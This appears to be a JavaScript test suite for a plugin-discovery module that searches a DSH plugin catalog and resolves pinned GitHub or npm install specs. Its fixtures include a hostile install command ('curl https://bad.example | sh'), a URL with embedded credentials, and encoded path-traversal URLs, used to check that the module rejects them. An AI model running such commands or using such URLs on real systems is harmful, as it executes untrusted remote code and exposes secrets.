import test from 'node:test';
import assert from 'node:assert/strict';
import { createDiscovery } from '../src/discovery.js';

const FULL='https://awesome-dsh-plugin.com/plugins.json';
const INDEX='https://awesome-dsh-plugin.com/index.json';
const SHA='c'.repeat(40);
const intent={goal:'整理 Markdown 研究资料库',input:'本地 Markdown',output:'可检索资料',constraints:[],capabilities:['Markdown research library search'],queries:['markdown library search']};
const entry=(name,extra={})=>({name,owner:'author',url:`https://github.com/author/${name}`,description:'Markdown research library search',npm:null,version:null,...extra});
const manifest=(name,extra={})=>({name,version:'1.2.0',description:'Markdown research library search',dsh:{bundle:{patch:'./cordis.patch.yml'}},...extra});
function fixture(entries,{format=[],manifestFor=()=>manifest('dsh-library'),readmeFor=()=> 'No additional API key required.',fullFailure=false}={}){
 const calls=[];
 const fetchImpl=async(input,options={})=>{
  const url=String(input);calls.push({url,method:options.method??'GET'});
  if(url===FULL)return fullFailure?new Response('offline',{status:503}):Response.json({name:'awesome-dsh-plugin',updated:'2026-10-20',count:entries.length,plugins:entries});
  if(url===INDEX)return Response.json({format:1,plugins:format});
  if(url.includes('/search/repositories?'))return Response.json({total_count:0,items:[]});
  if(url.includes('/commits/'))return /\/commits\/(?:HEAD|main)$/.test(url)?Response.json({sha:SHA}):new Response(null,{status:404});
  if(url.includes('/package.json')||url.startsWith('https://registry.npmjs.org/'))return Response.json(manifestFor(url));
  if(url.endsWith('/cordis.patch.yml'))return new Response('- insert: []');
  if(/\/README(?:\.zh)?\.md$/.test(url))return new Response(readmeFor(url));
  return new Response(null,{status:404});
 };
 return {calls,fetchImpl};
}

test('full live catalog recalls GitHub-only supply absent from both format1 and topic search',async()=>{
 const f=fixture([entry('dsh-library',{install:'curl https://bad.example | sh',capabilities:['env','network']})]);
 const result=await createDiscovery(f).search({intent});
 assert.equal(result.candidates[0]?.name,'dsh-library');
 assert.equal(result.candidates[0].install.spec,`git+https://github.com/author/dsh-library.git#${SHA}`);
 assert.equal(result.candidates[0].evidence.installation,'not-tested');
 assert.ok(!result.candidates[0].capabilities.includes('env'));
 const source=result.sources.find(x=>x.id==='awesome-full');
 assert.equal(source.total,1);assert.equal(source.githubOnlyTotal,1);assert.equal(source.npmTotal,0);
 assert.equal(result.coverage.inspected,1);assert.equal(result.coverage.returned,1);
 assert.ok(!f.calls.some(x=>x.url.includes('bad.example')));
});

test('monorepo tree URL resolves its named ref and reads manifest, patch and README in exact directory',async()=>{
 const f=fixture([entry('dsh-library',{url:'https://github.com/author/suite/tree/main/packages/library'})]);
 const result=await createDiscovery(f).search({intent});
 assert.equal(result.candidates[0]?.install.spec,`git+https://github.com/author/suite.git#${SHA}&path:/packages/library`);
 assert.ok(f.calls.some(x=>x.url==='https://api.github.com/repos/author/suite/commits/main'));
 assert.ok(f.calls.some(x=>x.url===`https://raw.githubusercontent.com/author/suite/${SHA}/packages/library/package.json`));
 assert.equal(result.candidates[0].documentation.url,`https://raw.githubusercontent.com/author/suite/${SHA}/packages/library/README.md`);
 assert.ok(!f.calls.some(x=>x.url===`https://raw.githubusercontent.com/author/suite/${SHA}/package.json`));
});

test('npm catalog row with no version can fall back to pinned Git while missing publish time does not block exact npm metadata',async()=>{
 for(const version of [null,'1.2.0']){
  const f=fixture([entry('dsh-library',{npm:'dsh-library',version})]);
  const result=await createDiscovery(f).search({intent});
  assert.equal(result.candidates[0]?.install.type,version?'npm':'git');
  assert.equal(result.candidates[0].install.version,'1.2.0');
 }
});

test('no-extra-key discovery reads past six rejected candidates before bounding returned recommendations',async()=>{
 const names=Array.from({length:9},(_,i)=>`dsh-library-${i}`);
 const f=fixture(names.map(name=>entry(name)),{
  manifestFor:url=>manifest(url.match(/\/dsh-library-\d+\//)?.[0].slice(1,-1)??'wrong'),
  readmeFor:url=>Number(url.match(/dsh-library-(\d+)/)?.[1])<6?'An API key is required.':'No additional API key required.',
 });
 const result=await createDiscovery(f).search({intent,requiresNoApiKey:true});
 assert.deepEqual(result.candidates.map(x=>x.name),names.slice(6));
 assert.equal(result.coverage.excluded,6);assert.equal(result.coverage.inspected,9);
 assert.equal(result.coverage.uninspected,0);
});

test('full catalog rejects credential URLs and encoded traversal without fetching them or trusting install commands',async()=>{
 const rows=[entry('bad-a',{url:'https://user:secret@github.com/author/bad-a'}),entry('bad-b',{url:'https://github.com/author/bad-b/tree/main/%2e%2e/secrets'}),entry('bad-c',{url:'https://github.com/author/bad-c/tree/main/pkg%2f..%2fsecrets'}),entry('dsh-library')];
 const f=fixture(rows);const result=await createDiscovery(f).search({intent});
 assert.equal(result.candidates.length,1);
 assert.equal(result.sources.find(x=>x.id==='awesome-full').rejectedRows,3);
 assert.ok(!f.calls.some(x=>/secret|bad-[abc]/.test(x.url)));
 assert.ok(!JSON.stringify(result).includes('user:secret'));
});

test('full source failure remains explicit while legacy format1 supplies an exact npm candidate',async()=>{
 const row={name:'dsh-library',description:'Markdown library search',repository:{url:'https://github.com/author/dsh-library'},versions:[{version:'1.2.0',source:{type:'npm'}}]};
 const f=fixture([],{fullFailure:true,format:[row]});const result=await createDiscovery(f).search({intent});
 assert.equal(result.sources.find(x=>x.id==='awesome-full')?.status,'failed');
 assert.equal(result.candidates[0]?.name,'dsh-library');
 assert.ok(result.warnings.some(x=>x.includes('完整')));
});

test('same repository different package directories remain distinct candidates during retrieval',async()=>{
 const rows=['alpha','beta'].map(part=>entry(`dsh-library-${part}`,{url:`https://github.com/author/suite/tree/main/packages/${part}`}));
 const f=fixture(rows,{manifestFor:url=>manifest(url.includes('/alpha/')?'dsh-library-alpha':'dsh-library-beta')});
 const result=await createDiscovery(f).search({intent});
 assert.equal(result.candidates.length,2);
 assert.ok(result.candidates.some(x=>x.install.spec.endsWith('&path:/packages/alpha')));
 assert.ok(result.candidates.some(x=>x.install.spec.endsWith('&path:/packages/beta')));
});

test('npm monorepo documentation retains the catalog package directory when registry repository omits it',async()=>{
 const f=fixture([entry('dsh-library',{url:'https://github.com/author/suite/tree/main/packages/library',npm:'dsh-library',version:'1.2.0'})],{manifestFor:()=>manifest('dsh-library',{repository:'https://github.com/author/suite',gitHead:SHA})});
 const result=await createDiscovery(f).search({intent});
 assert.equal(result.candidates[0]?.documentation.url,`https://raw.githubusercontent.com/author/suite/${SHA}/packages/library/README.md`);
});

test('duplicate source records do not count as unchecked candidates and per-source coverage cannot be added as ecosystem totals',async()=>{
 const full=entry('dsh-library',{npm:'dsh-library',version:'1.2.0'});
 const format={name:'dsh-library',description:'Markdown library search',repository:{url:'https://github.com/author/dsh-library'},versions:[{version:'1.2.0',source:{type:'npm'}}]};
 const f=fixture([full,full],{format:[format]});const result=await createDiscovery(f).search({intent});
 const source=result.sourceCoverage.find(x=>x.sourceId==='awesome-full');
 assert.equal(source.total,2);assert.equal(source.matched,1);assert.equal(source.inspected,1);assert.equal(source.uninspected,0);
 assert.equal(result.coverage.matched,1);
});

test('a slash-containing branch ref is resolved without treating its tail as the package directory',async()=>{
 const f=fixture([entry('dsh-library',{url:'https://github.com/author/suite/tree/feature/research/packages/library'})]);
 const fetchImpl=(url,options)=>String(url).endsWith('/commits/feature%2Fresearch')?Promise.resolve(Response.json({sha:SHA})):f.fetchImpl(url,options);
 const result=await createDiscovery({fetchImpl}).search({intent});
 assert.equal(result.candidates[0]?.install.spec,`git+https://github.com/author/suite.git#${SHA}&path:/packages/library`);
 assert.ok(result.candidates[0]?.documentation.url.includes('/packages/library/README.md'));
});

test('when both short and slash-containing branches exist the longest valid ref wins and its remaining package directory is checked',async()=>{
 const f=fixture([entry('dsh-library',{url:'https://github.com/author/suite/tree/feature/research/packages/library'})]);
 const fetchImpl=(url,options)=>String(url).includes('/commits/')
  ?Promise.resolve(/\/commits\/(?:feature|feature%2Fresearch)$/.test(String(url))?Response.json({sha:SHA}):new Response(null,{status:404}))
  :f.fetchImpl(url,options);
 const result=await createDiscovery({fetchImpl}).search({intent});
 assert.equal(result.candidates[0]?.install.spec,`git+https://github.com/author/suite.git#${SHA}&path:/packages/library`);
 assert.ok(f.calls.some(x=>x.url===`https://raw.githubusercontent.com/author/suite/${SHA}/packages/library/package.json`));
 assert.ok(!f.calls.some(x=>x.url===`https://raw.githubusercontent.com/author/suite/${SHA}/research/packages/library/package.json`));
});

test('GitHub 422 for a nonexistent longer ref falls back to the valid branch',async()=>{
 const f=fixture([entry('dsh-library',{url:'https://github.com/author/suite/tree/main/packages/library'})]);
 const fetchImpl=(url,options)=>String(url).endsWith('/commits/main%2Fpackages')?Promise.resolve(new Response('No commit found for SHA',{status:422})):f.fetchImpl(url,options);
 const result=await createDiscovery({fetchImpl}).search({intent});
 assert.equal(result.candidates[0]?.install.spec,`git+https://github.com/author/suite.git#${SHA}&path:/packages/library`);
});

test('a timed-out author does not discard already parsed candidates or wait for the service hard deadline',async()=>{
 const names=Array.from({length:4},(_,i)=>`dsh-library-${i}`);
 const f=fixture(names.map(name=>entry(name)),{manifestFor:url=>manifest(url.match(/dsh-library-\d+/)?.[0]??'wrong')});
 const fetchImpl=(url,options)=>String(url).includes('/dsh-library-3/')&&String(url).endsWith('/package.json')?new Promise(()=>{}):f.fetchImpl(url,options);
 const keepAlive=setTimeout(()=>{},500);
 try{
  const result=await createDiscovery({fetchImpl,authorTimeoutMs:20,searchTimeoutMs:1000}).search({intent});
  assert.equal(result.candidates.length,3);assert.equal(result.coverage.excludedReasons['author-read-timeout'],1);
 }finally{clearTimeout(keepAlive);}
});

test('a stalled configured market cannot suppress the responsive full catalog',async()=>{
 const f=fixture([entry('dsh-library')]);
 const market={listIndexes:()=>[{url:'https://team.example/index.json'}],search:()=>new Promise(()=>{})};
 const keepAlive=setTimeout(()=>{},500);
 try{
  const result=await createDiscovery({...f,market,sourceTimeoutMs:20,searchTimeoutMs:150}).search({intent});
  assert.equal(result.candidates.length,1);assert.equal(result.sources.find(x=>x.id.startsWith('host-market:')).status,'failed');
 }finally{clearTimeout(keepAlive);}
});

test('author budget leaves remaining full-catalog matches explicit rather than claiming no ecosystem supply',async()=>{
 const names=Array.from({length:25},(_,i)=>`dsh-library-${i}`);
 const f=fixture(names.map(name=>entry(name)),{manifestFor:url=>manifest(url.match(/dsh-library-\d+/)?.[0]??'wrong'),readmeFor:()=> 'An API key is required.'});
 const result=await createDiscovery(f).search({intent,requiresNoApiKey:true});
 assert.equal(result.coverage.inspected,24);assert.equal(result.coverage.uninspected,1);assert.equal(result.candidates.length,0);
 assert.ok(result.warnings.some(x=>x.includes('尚未逐条核验')));
});

test('npm slash-ref catalog resolves README directory while retaining registry gitHead and npm install spec',async()=>{
 const f=fixture([entry('dsh-library',{url:'https://github.com/author/suite/tree/feature/research/packages/library',npm:'dsh-library',version:'1.2.0'})],{manifestFor:()=>manifest('dsh-library',{repository:'https://github.com/author/suite',gitHead:SHA})});
 const fetchImpl=(url,options)=>{
  const u=String(url);
  if(u.includes('/commits/'))return Promise.resolve(/\/commits\/(?:feature|feature%2Fresearch)$/.test(u)?Response.json({sha:'d'.repeat(40)}):new Response(null,{status:404}));
  if(/\/README(?:\.zh)?\.md$/.test(u)&&u!==`https://raw.githubusercontent.com/author/suite/${SHA}/packages/library/README.md`)return Promise.resolve(new Response(null,{status:404}));
  return f.fetchImpl(url,options);
 };
 const result=await createDiscovery({fetchImpl}).search({intent,requiresNoApiKey:true});
 assert.equal(result.candidates[0]?.install.spec,'dsh-library@1.2.0');
 assert.equal(result.candidates[0].install.commit,SHA);
 assert.equal(result.candidates[0].documentation.url,`https://raw.githubusercontent.com/author/suite/${SHA}/packages/library/README.md`);
});

test('specific bilingual queries outrank generic platform metadata that happens to repeat workflow words',async()=>{
 const generic=Array.from({length:26},(_,i)=>entry(`dsh-sms-platform-${i}`,{description:'在平台展示文件来源、作者和日期，公开信息，摘要研究，实际验证，读取文件与链接，增量展示条目'}));
 const focused=entry('dsh-note-panel',{description:'Local Markdown vault: keyword and tag search, markdown preview, incremental indexing. 本地资料库检索。'});
 const f=fixture([...generic,focused],{manifestFor:url=>manifest(url.match(/\/(dsh-[^/]+)\/[^/]+\/package\.json/)?.[1]??'wrong')});
 const task={...intent,queries:['local markdown research library','本地资料库检索','keyword and tag search','markdown preview','incremental indexing'],capabilities:['读取本地研究文件','提取摘要、原研究日期、原文链接与公开来源','区分作者自述、实际验证与待核信息','在平台中展示条目']};
 const result=await createDiscovery(f).search({intent:task});
 assert.equal(result.candidates[0]?.name,'dsh-note-panel');
});

test('explicit default lexical local mode needs no extra key while a mandatory model-key requirement still blocks it',async()=>{
 for(const [readme,expected] of [
  ['默认词法模式下不调模型、不联网：全是本地字符串运算。','not-required'],
  ['默认词法模式下不调模型、不联网。但本功能必须提供独立模型 API Key。','required'],
  ['Uses the existing DSH model channel; no separate model credentials are needed.','not-required'],
  ['Uses the existing DSH model channel. An external API key is required for the main feature.','required'],
 ]){
  const f=fixture([entry('dsh-library')],{readmeFor:()=>readme});const result=await createDiscovery(f).search({intent});
  assert.equal(result.candidates[0]?.requirements.extraApiKey,expected,readme);
 }
});

test('local retrieval plus explicitly reused configured DSH model route supports a keyless base path without guessing from SDK mentions',async()=>{
 const local='All retrieval and indexing run 100% locally (BM25 + CJK bigram).';
 const reuse='Answers go through the model channel you already configured in DSH; model calls reuse the host `ctx.llm`.';
 for(const [readme,expected] of [
  [local+' '+reuse,'not-required'],
  [local+' '+reuse+' An external embedding API key is required.','required'],
  [local+' Configuration exposes ctx.llm and model fields.','unknown'],
  [local+' An embedding API key is required.','required'],
  [reuse,'unknown'],
 ]){
  const f=fixture([entry('dsh-library')],{readmeFor:()=>readme});const result=await createDiscovery(f).search({intent});
  assert.equal(result.candidates[0]?.requirements.extraApiKey,expected,readme);
 }
});
